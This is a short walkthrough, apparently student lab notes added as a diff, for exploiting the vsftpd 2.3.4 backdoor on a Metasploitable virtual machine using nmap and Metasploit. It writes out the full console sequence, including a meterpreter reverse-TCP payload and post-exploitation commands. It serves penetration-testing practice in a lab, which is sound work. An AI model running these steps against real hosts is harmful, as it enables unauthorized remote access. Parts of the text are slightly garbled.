@@ -1,0 +1,53 @@
+Step-1: Download vmware workstation pro and Kali OS.
+Step-2: Download metasploit from https://github.com/rampriyakilari/ICS-Needs/blob/main/metasploit.txt
+Step-3: Download nmap tool -> https://nmap.org
+
+Open metasploit in the virtual machine and power on
+username and password is same: msfadmin.
+-> If there is no zenmap tool you can use quick scan in Kali linux nmap -v -A 192.168.59.135 (meta sploit IP address)
+-> If nmap is installed in the system, paste the metasploit IP address in the target and click scan
+-> If " we port 21
+  /tcp open ftp vs ftpd 2.3.4
+  /ftp-anon. Anonymous FTP login allowed (FTP code 130)
+  /ftp-syst.
+  /STAT?
+  /FTP server status:
+  /Connected to 192.168.59.1
+  /Logged in as ftp.
+  /TYPE: ASCII
+  /No session bandwidth limit
+  /Session timeout in seconds is 300.
+  /Control connection is plain text.
+  /Data connections will be plain text
+  /vsFTPd 2.3.4 -Secure fast, stable
+  /End of status.
+-> Attack on this port if you enable version of the service, just go to browser and search for version
+
+To find whether the service version is having any vulnerability.
+-> To exploit we can use metasploit
+-> Go to Kali machine open terminal and type msfconsole
+-> It displays no of exploits of the system.
+-> To know the exploits of that service session.
+To find name of the exploit
+-> search vsftpd.
+To use the exploit.
+-> Use exploit/unix/ftp/vsftpd_234_backdoor
+To know more about exploit use info
+-> info
+set rhost ip address
+-> set RHOST 192.168.59.135.
+set lhost ip address
+-> set LHOST 192.168.59.134.
+Use info to check RHOST
+
+-> info
+To take the advantages of exploit we use payload.
+-> show payloads.
+set the payload
+-> set payload cmd/Linux/http/x64/meterpreter_reverse_tcp
+exploit
+-> run
+Use linux command such as ls
+-> ls
+-> cat nohup.out
+-> exit
